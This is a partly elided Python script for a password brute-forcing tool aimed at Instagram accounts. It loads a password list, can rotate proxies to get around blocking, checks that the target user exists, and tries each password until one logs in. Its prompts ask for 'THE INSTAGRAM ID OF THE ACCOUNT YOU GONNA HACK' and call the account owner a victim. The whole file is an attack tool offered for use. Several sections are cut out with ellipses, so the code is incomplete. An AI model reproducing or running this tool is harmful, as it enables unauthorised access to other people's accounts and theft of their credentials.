type ( 'BEST TOOL FOR BRUTEFORCING' )
'''
TODO LIST:
...
os.system('clear')
os.system("figlet -t       ' MODERN KEYLOGHER ' | lolcat")
os.system("figlet -f slant '      MUHIL RAJ ' | lolcat")
...
class Instabrute():
	def __init__(self, username, passwordsFile='password.txt'):
		...
		UsePorxy = Input('[MK] USE PROXY?? RECOMENDED NOT TO USE (y/n): ').upper()
		...
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				...
				if (passwordsNumber > 0):
					print ('[MK] %s PASSWORDS LOADED SUCCESSFULLY' % passwordsNumber)
				else:
					print('Password file are empty, so add passwords to it to continue.')
					Input('[MK] click enter to exit')
					exit()
		else:
			print ('Please create passwords file named "%s"' % self.passwordsFile)
			Input('[MK] Press enter to exit')
			exit()
	...
	def randomProxy(self):
		...
		try:
			print('')
			print('[MK] Checking new ip...')
			print ('[MK] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
		except Exception as e:
			print  ('[MK] Can\'t reach proxy "%s"' % proxy)
		print('')
	...
	def IsUserExists(self):
		...
		if (r.status_code == 404):
			print ('[MK] User named "%s" not found' % username)
			Input ('[MK] Press enter to exit')
			exit()
	...
	def Login(self, password):
		...
		if (data['status'] == 'fail'):
			...
			UsePorxy = Input('[MK] TYPE n TO CONTINUE (n): ').upper()
			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
...
instabrute = Instabrute(Input('[++] ENTER THE INSTAGRAM ID OF THE ACCOUNT YOU GONNA HACK: '))

try:
	delayLoop = int(Input('[MK] ADD DELAY BETWEEN THE BRUTEFORCE ACTION (in seconds): ')) 
except Exception as e:
	print ('[MK] YOU DIDNT ENTER THE TIME GAP SO DEFAULT ACTION TAKEN "2"')
	delayLoop = 2
print ('')
...
for password in instabrute.passwords:
	...
	if sess:
		os.system("echo -n '[MK] PASSWORD FOUND, DONT MISSUSE' | pv -qL 5 | lolcat")
		print (': %s' % [instabrute.username,password])
		break
	else:
		print ('[MK] COMPARING YOUR PASSWORD WITH VICTIM PASSWORD [%s]' % password)
